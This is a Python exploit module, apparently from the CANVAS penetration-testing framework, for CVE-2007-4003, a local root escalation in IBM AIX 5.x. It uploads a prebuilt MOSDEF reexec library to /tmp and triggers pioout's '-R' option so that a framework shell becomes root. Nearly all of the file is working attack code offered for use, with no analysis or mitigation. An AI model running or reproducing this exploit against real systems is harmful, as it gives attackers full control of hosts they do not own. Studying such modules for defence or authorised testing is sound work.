#!/usr/bin/env python

# AIXroot is a multiheaded (HYDRA!?) local root gettermathingabob for AIX 5.x

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

from canvasexploit import canvasexploit
from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

NAME                                = 'CVE-2007-4003: pioout'
VERSION                             = '1.0'
DESCRIPTION                         = 'Local privilege escalation for AIX 5.x'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'IBM'
DOCUMENTATION['Repeatability']      = 'unlimited'
DOCUMENTATION['VersionsAffected']   = '5.X'
DOCUMENTATION['CVE Name']           = 'CVE-2007-4003'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4003'
DOCUMENTATION['CVSS'] = 6.9

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['AIX', 'powerpc'] ]
PROPERTY['VERSION']                 = [ '5.X' ]

class CVE_2007_4003:
    def __init__(self, parent, target = '5.2'):
        self.description    = 'pioout shared library load local root'
        self.t_path         = '/usr/lib/lpd/pio/etc/pioout'
        self.l_path         = '/tmp/seriobiz.a'
        self.target         = target
        self.log            = parent.log
        return
    
    def getlib(self):
        """ read the local mosdef reexec library """
        
        libs        = {}
        path        = 'libs' + os.sep + 'aixroot' + os.sep
        libs['5.1'] = path + 'mosdef_reexec_51.a' 
        libs['5.2'] = path + 'mosdef_reexec_52.a'        

        try:
            return open(libs[self.target]).read()
        except IOError:
            self.log("could not read library ...")
        except KeyError:
            self.log("do not have library for target %s ..." % self.target)
        return None
        
    def putlib(self, node):
        """ upload shared library """
        
        library     = self.getlib()
        filename    = self.l_path
        O_RDWR      = node.shell.libc.getdefine('O_RDWR')
        O_CREAT     = node.shell.libc.getdefine('O_CREAT')
        
        node.shell.unlink(filename)

        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if fd < 0:
            self.log('could not open %s ...' % filename)
            return 0
        self.log('%s opened as fd=%d' % (filename, fd))
        r = node.shell.write(fd, library)
        if r != 1:
            self.log('write failed ...')
            return 0
        self.log('file wrote successfully')
        r = node.shell.close(fd);
        if r == -1:
            self.log('error while trying to close the fd')
        return
    
    def exploit(self, node):
        """ trigger the mosded reexec execve """

        self.putlib(node)
        
        vars            = {}
        vars['MOSDEFD'] = "MOSDEFD=%d" % node.shell.fd
        vars['NODEFD']  = node.shell.fd
        vars['LIBRARY'] = self.l_path
        vars['TARGET']  = self.t_path
        
        code            =   """
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "waitpid" as "waitpid"
        #import "local", "getpid" as "getpid"
        #import "local", "poll" as "poll"
        #import "local", "_exit" as "_exit"
        
        #include <sys/poll.h>
        
        #import "string", "LIBRARY" as "LIBRARY"
        #import "string", "TARGET" as "TARGET"
        #import "string", "MOSDEFD" as "MOSDEFD"

        #import "int", "NODEFD" as "NODEFD"
        
        int
        main()
        {
            char *exec[4];
            char *env[2];
            int pid;
            int status;
            struct pollfd fds;
            int ret;
            
            exec[0] = TARGET;
            exec[1] = "-R";
            exec[2] = LIBRARY;
            exec[3] = 0;
            
            env[0] = MOSDEFD;
            env[1] = 0;
         
            sendint(0);
            
            pid = fork();
            
            if (pid)
            {
                // wait for child 
                fds.fd      = NODEFD;                               
                fds.revents = 0; 
                fds.events  = 0;
                status      = 1;
                // we use poll as a sleep
                poll(&fds, 1, 1000);
                
                // aix arg ordering for kwaitpid is different!
                ret = waitpid(&status, pid, 0);
            }
            else
            {
                // exploit
                execve(exec[0], exec, env);
                _exit(0);
            }
        }
        """
        
        try:
            node.shell.runCode(code, vars)
        except:
            self.log("something bad happened!")
            import traceback
            traceback.print_exc(file=sys.stdout)
            return False
        return node
    
class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name               = "AIXrooter exploit"
    
    def run(self):
        self.log("*** this module is used from within the AIXrooter ***")
        return False
    
